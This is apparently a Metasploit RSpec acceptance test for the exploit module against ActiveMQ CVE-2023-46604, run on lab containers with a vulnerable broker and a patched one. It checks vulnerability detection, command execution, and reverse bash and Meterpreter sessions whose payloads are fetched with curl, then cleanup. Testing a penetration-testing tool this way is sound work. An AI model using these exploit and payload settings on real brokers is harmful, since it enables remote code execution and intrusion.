require 'acceptance_spec_helper'
require 'rbconfig'

RSpec.describe 'Native ActiveMQ OpenWire execution' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    console_command('version')
    argv = [RbConfig.ruby, 'test/module_targets/activemq_openwire/native_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-activemq.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-activemq-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    expect(stderr).to eq('')
    observer = 'test/module_targets/activemq_openwire/lifecycle_observer.rb'
    code = "load #{observer.inspect}; framework.modules.create(\"exploit/multi/misc/apache_activemq_rce_cve_2023_46604\").class.prepend(ModuleTargetActiveMqLifecycle)"
    expect(console_command("irb -e '#{code}'")).not_to match(/Error|Exception/)
    @lifecycle_path = File.join(ENV.fetch('MSF_CFGROOT_CONFIG'), 'activemq-lifecycle.jsonl')
    @http_observations = 0
  end

  after do
    stop_handlers
    services_closed
  end

  after(:all) do
    %w[affected fixed].each do |service|
      File.write(File.join(target_runtime.fetch('artifacts'), "vendor-#{service}.log"), target_exec(service, 'cat', '/opt/activemq/data/activemq.log'))
    end
  end

  { 'affected' => ['5.18.2', /appears to be vulnerable/i], 'fixed' => ['5.18.3', /not exploitable/i] }.each do |service, (version, result)|
    it "checks the actual #{service} version twice without false vulnerability results" do
      2.times do
        output = invoke(service, {}, action: 'check', allow_errors: service == 'fixed')
        expect(output).to include("Apache ActiveMQ #{version}")
        expect(output).to match(result)
      end
    end
  end

  [1, 2].each do |target|
    it "refuses the fixed broker through AutoCheck for target #{target}" do
      path = '/tmp/module-target-openwire-refused'
      target_exec('fixed', 'test', '!', '-e', path)
      payload = target == 1 ? 'cmd/linux/http/x64/exec' : 'cmd/unix/generic'
      options = { 'TARGET' => target, 'PAYLOAD' => payload, 'CMD' => "touch #{path}", 'DisablePayloadHandler' => true }
      options.merge!(fetch_options('guard')) if target == 1
      output = invoke('fixed', options, allow_errors: true)
      expect(output).to match(/not-vulnerable|not exploitable/i)
      expect(output).not_to include('Sent ClassPathXmlApplicationContext')
      target_exec('fixed', 'test', '!', '-e', path)
    end

    paths = target == 1 ? { '/' => 'Linux exec <&> "quote"' } : { '/' => 'root', '/module-target/context' => 'prefix space <&> "quote"' }
    paths.each do |uri, content|
      it "executes target #{target} through #{uri} twice with exact content and broker ownership" do
        command_twice(target, uri, content)
      end
    end
  end

  it 'initializes a working command callback with AutoCheck disabled on both repetitions' do
    command_twice(2, '/module-target/no-check', 'AutoCheck disabled', 'AutoCheck' => false)
  end

  it 'executes a Unix command with the payload handler disabled on both repetitions' do
    command_twice(2, '/module-target/no-handler', 'Handler disabled', 'DisablePayloadHandler' => true)
  end

  it 'refuses a closing CDATA payload before serving or executing it' do
    path = '/tmp/module-target-openwire-cdata'
    target_exec('affected', 'test', '!', '-e', path)
    output = invoke('affected', { 'PAYLOAD' => 'cmd/unix/generic', 'CMD' => "printf ']]>' > #{path}", 'DisablePayloadHandler' => true }, allow_errors: true)
    expect(output).to include('may not contain the CDATA closing tag')
    expect(output).not_to include('Sent ClassPathXmlApplicationContext')
    target_exec('affected', 'test', '!', '-e', path)
  end

  [1, 2].each do |target|
    it "opens two fresh command shells for target #{target} and proves actual file ownership" do
      payload = target == 1 ? 'cmd/linux/http/x64/shell/reverse_tcp' : 'cmd/unix/reverse_bash'
      session_twice(target, payload)
    end
  end

  [8080, 8081].each do |port|
    it "fetches two genuine Meterpreter sessions with HTTP port #{port} and removes fetch artifacts" do
      session_twice(1, 'cmd/linux/http/x64/meterpreter/reverse_tcp', port)
    end
  end

  def invoke(service, options, action: 'run -z', allow_errors: false)
    run_target_module('exploit/multi/misc/apache_activemq_rce_cve_2023_46604', service, {
      'TARGET' => 2, 'PAYLOAD' => 'cmd/unix/generic', 'AutoCheck' => true,
      'SRVHOST' => listener_host, 'SRVPORT' => 8080, 'URIPATH' => '/module-target/context',
      'WfsDelay' => 2, 'VERBOSE' => true
    }.merge(options), action: action, allow_errors: allow_errors, endpoint_options: {
      'RHOST' => target_runtime.fetch('module_endpoints').fetch(service).fetch('host'), 'RPORT' => 61616
    }, command_timeout: 70)
  end

  def command_twice(target, uri, content, options = {})
    path = '/tmp/module-target-openwire-command'
    begin
      2.times do |index|
        original = tmp_files
        target_exec('affected', 'test', '!', '-e', path)
        payload = target == 1 ? 'cmd/linux/http/x64/exec' : 'cmd/unix/generic'
        invocation = {
          'TARGET' => target, 'PAYLOAD' => payload, 'CMD' => "printf '%s' '#{content}' > #{path}",
          'URIPATH' => uri, 'DisablePayloadHandler' => false
        }.merge(options)
        invocation.merge!(fetch_options('command', index)) if target == 1
        output = invoke('affected', invocation)
        expect(output).to include('Using URL:')
        wait_for_expect(10, 0.1) { expect(owner(path)).to eq('activemq') }
        expect(target_exec('affected', 'cat', path)).to eq(content)
        target_exec('affected', 'rm', path)
        expect(tmp_files).to eq(original)
        stop_handlers
        services_closed
      end
    ensure
      target_exec('affected', 'rm', '-f', path)
    end
  end

  def session_twice(target, payload, fetch_port = 8080)
    path = '/tmp/module-target-openwire-session'
    meterpreter = payload.include?('meterpreter')
    begin
      2.times do |index|
        original = tmp_files
        target_exec('affected', 'test', '!', '-e', path)
        options = {
          'TARGET' => target, 'PAYLOAD' => payload, 'DisablePayloadHandler' => false,
          'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10
        }
        options.merge!(fetch_options(meterpreter ? 'meterpreter' : 'shell', index, fetch_port)) if payload.start_with?('cmd/linux/')
        output = invoke('affected', options)
        expect(output).to include('Sent ClassPathXmlApplicationContext configuration file.')
        session = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
        expect(session).not_to be_nil, output
        command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "touch #{path}"
        proof = console_command("sessions -i #{session} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
        expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
        wait_for_expect(15, 0.1) { expect(owner(path)).to eq('activemq') }
        stop_handlers
        target_exec('affected', 'rm', path)
        wait_for_expect(10, 0.1) { expect(tmp_files).to eq(original) }
        services_closed
      end
    ensure
      stop_handlers
      target_exec('affected', 'rm', '-f', path)
    end
  end

  def owner(path)
    target_exec('affected', 'sh', '-c', "if test -f #{path}; then stat -c %U #{path}; fi").strip
  end

  def fetch_options(kind, index = 0, port = 8080)
    {
      'FETCH_SRVHOST' => listener_host, 'FETCH_SRVPORT' => port,
      'FETCH_URIPATH' => '/module-target/payload', 'FETCH_COMMAND' => 'CURL',
      'FETCH_FILENAME' => "module-target-openwire-#{kind}-#{port}-#{index}",
      'FETCH_WRITABLE_DIR' => '/tmp', 'FETCH_DELETE' => true
    }
  end

  def tmp_files
    target_exec('affected', 'find', '/tmp', '-mindepth', '1', '-maxdepth', '1', '-printf', "%f\n").lines.map(&:strip).sort
  end

  def stop_handlers
    console_command('sessions -K')
    console_command('jobs -K')
  end

  def services_closed
    code = 'puts "MODULE_TARGET_HTTP_STATE=" + JSON.generate(ModuleTargetActiveMqLifecycle.services)'
    output = console_command("irb -e '#{code}'")
    services = JSON.parse(output.match(/^MODULE_TARGET_HTTP_STATE=(.*)$/)[1])
    events = File.exist?(@lifecycle_path) ? File.readlines(@lifecycle_path).map { |line| JSON.parse(line) } : []
    fetch_states = events.filter_map { |event| event['fetch'] }
    @http_observations += 1
    File.write(File.join(target_runtime.fetch('artifacts'), "http-cleanup-#{@http_observations}.json"), JSON.pretty_generate(services: services, lifecycle_events: events))
    expect(services.flat_map { |server| server.fetch('resources') }).to be_empty
    [8080, 8081].each do |port|
      retained = services.find { |server| server.fetch('port') == port }
      if retained
        # Fetch's existing pool retains caller references after removing routes.
        # Only a service actually owned by a fetch payload may remain listening.
        expect(fetch_states.map { |server| server.fetch('id') }).to include(retained.fetch('id'))
      end
      paths = ['/module-target-probe', '/module-target/context', '/module-target/no-handler', '/module-target/no-check', '/']
      paths.concat(events.flat_map { |event| event['owned_fetch_resources'] || [] })
      paths.uniq.each do |path|
        wait_for_expect(5, 0.1) do
          # The format token belongs to curl, not Ruby's format method.
          result = target_exec('affected', 'sh', '-c', "curl --silent --output /dev/null --write-out '%{http_code}' --connect-timeout 1 --max-time 1 http://#{listener_host}:#{port}#{path}; printf ':%s' \"$?\"") # rubocop:disable Style/FormatStringToken
          expect(result).to eq(retained ? '404:0' : '000:7')
        end
      end
    end
  end
end
